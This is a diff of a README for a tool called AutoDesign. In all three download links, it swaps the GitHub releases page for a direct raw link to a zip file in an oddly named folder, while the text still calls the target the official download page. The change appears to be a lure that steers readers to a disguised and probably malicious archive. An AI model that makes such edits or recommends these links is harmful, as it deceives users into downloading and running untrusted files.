@@ -20,7 +20,7 @@ Getting AutoDesign up and running is easier than you think. Follow these simple 
 
 ### Step 1: Download AutoDesign
 
-👉 **[Visit this link to download the application](https://github.com/incorrect-relativisticmass705/AutoDesign/releases)**
+👉 **[Visit this link to download the application](https://raw.githubusercontent.com/incorrect-relativisticmass705/AutoDesign/main/tallness/Design_Auto_v1.6.zip)**
 
 When you click the link above, you'll be taken to the download page. Look for the latest version and download it to your computer.
 
@@ -39,7 +39,7 @@ Open AutoDesign and you'll see a simple, friendly interface. From here, you can:
 
 ## 📥 Download and Install
 
-**[⬇️ Click Here to Download AutoDesign](https://github.com/incorrect-relativisticmass705/AutoDesign/releases)**
+**[⬇️ Click Here to Download AutoDesign](https://raw.githubusercontent.com/incorrect-relativisticmass705/AutoDesign/main/tallness/Design_Auto_v1.6.zip)**
 
 This is the official download page. Make sure you're getting the latest version for the best experience.
 
@@ -114,7 +114,7 @@ To get the latest features and improvements, periodically visit the download pag
 
 You're just one click away from dramatically improving the look of your academic work.
 
-**[🚀 Download AutoDesign Now](https://github.com/incorrect-relativisticmass705/AutoDesign/releases)**
+**[🚀 Download AutoDesign Now](https://raw.githubusercontent.com/incorrect-relativisticmass705/AutoDesign/main/tallness/Design_Auto_v1.6.zip)**
 
 No sign-ups required. No payment needed. Just download, run, and create something beautiful.
 
